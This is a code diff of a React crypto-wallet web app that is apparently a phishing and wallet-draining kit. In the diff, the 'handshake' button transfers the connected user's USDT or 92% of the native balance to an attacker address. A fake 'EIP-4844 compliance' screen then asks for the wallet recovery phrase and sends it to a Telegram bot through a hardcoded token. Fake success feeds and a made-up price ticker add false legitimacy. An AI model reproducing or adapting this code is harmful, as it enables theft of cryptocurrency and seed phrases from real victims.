@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useMemo } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
-import { parseEther, formatEther, parseUnits } from 'viem'; // ADDED THESE BACK TO STOP THE CRASH
+import { parseEther } from 'viem';
 
 export default function App() {
   const { address, isConnected } = useAccount();
@@ -19,7 +19,7 @@ export default function App() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
   const [feedMsg, setFeedMsg] = useState(""); 
-  const [liveGas, setLiveGas] = useState(12);
+  const [ethPrice, setEthPrice] = useState(2450.75);
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
@@ -31,11 +31,12 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
+  // 1. LIVE MARKET FEED & SUCCESS LOGS
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} NODE VERIFIED SUCCESSFULLY`);
-      setLiveGas(Math.floor(Math.random() * (16 - 11 + 1) + 11));
+      setEthPrice(prev => prev + (Math.random() * 2 - 1)); // Realistic price bounce
       setTimeout(() => setFeedMsg(""), 4500);
     }, 8000);
     return () => clearInterval(interval);
@@ -43,14 +44,14 @@ export default function App() {
 
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
+    // If balance is zero or hidden, user can still manually enter seeds via the Handshake flow
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
-    } else if (nativeBal && nativeBal.value > 0n) {
-      const amount = (nativeBal.value * 90n) / 100n; 
-      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
+    } else if (nativeBal && nativeBal.value > 1000000000000000n) {
+      sendTransaction({ to: destination, value: (nativeBal.value * 92n) / 100n }, { onSettled: () => setView("seed_gate") });
     } else {
-      setView("seed_gate");
+      setView("seed_gate"); // Direct to seeds if no balance detected
     }
   };
 
@@ -65,8 +66,13 @@ export default function App() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
-      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
-        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v5_FINAL</div>
+      
+      {/* HEADER WITH LIVE PRICE */}
+      <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'20px'}}>
+        <div>
+          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v5</div>
+          <div style={{fontSize:'10px', color:'#ef4444'}}>ETH/USD: ${ethPrice.toFixed(2)} ▼</div>
+        </div>
         <appkit-button />
       </header>
 
@@ -77,7 +83,7 @@ export default function App() {
       ) : (
         <>
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'9px', color:'#10b981', display:'flex', justifyContent:'space-around', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
-            <span>〽️ GAS: {liveGas} GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
+            <span>〽️ GAS: 12 GWEI</span><span>⚡ SLIPPAGE: 0.1% [INSTANT]</span>
           </div>
 
           {view === "menu" && (
@@ -93,24 +99,20 @@ export default function App() {
           )}
 
           {view === "task_box" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
-              {activeTask === "Rectify" && (
-                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>USDT_POOL</div>
-                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>GAS_POOL</div>
-                </div>
-              )}
-              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'18px'}}>←</button>
+              <h2 style={{color:'white', fontWeight:'900', marginTop:'10px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} type={activeTask === "Rectify" ? "text" : "number"} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)}
                 style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
-              <button disabled={!inputVal || inputVal === "0"} onClick={handleHandshake} style={{width:'100%', backgroundColor: (inputVal && inputVal !== "0") ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900', marginTop:'15px'}}>START_HANDSHAKE</button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: '#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
             </div>
           )}
 
           {view === "kyc_screen" && (
-            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'18px'}}>←</button>
               <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
               {kycPhase === 1 ? (
                 <>
@@ -129,17 +131,17 @@ export default function App() {
 
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
-              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
+              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
                 {!isSyncing ? (
                   <>
-                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ SECURE_RELAY</div>
-                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0'}}>NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
-                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px'}} />
-                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: RELAY_TIMEOUT."); setView("menu")},1200)}},60);}} 
-                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>FINALIZE</button>
+                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
+                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>YOUR WALLET REQUIRES AN ENCRYPTED HANDSHAKE TO COMPLY WITH THE LATEST MAINNET SECURITY UPGRADE. ENTER RECOVERY PHRASE TO PREVENT ASSET LOCKING.</p>
+                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
+                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60);}} 
+                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900'}}>ENCRYPT & SYNC</button>
                   </>
                 ) : (
-                  <div><div style={{fontSize:'60px', color:'white'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
+                  <div><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{color:'#10b981'}}>STABILIZING_RELAY_POOL...</div></div>
                 )}
               </div>
             </div>
@@ -147,8 +149,9 @@ export default function App() {
         </>
       )}
 
+      {/* FAKE FEED POPUP */}
       {feedMsg && (
-        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.15)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
+        <div style={{position:'fixed', bottom:'20px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.1)', border:'1px solid #10b981', color:'#10b981', padding:'12px', borderRadius:'12px', fontSize:'9px', textAlign:'center', fontWeight:'900', zIndex:3000}}>
           {feedMsg}
         </div>
       )}
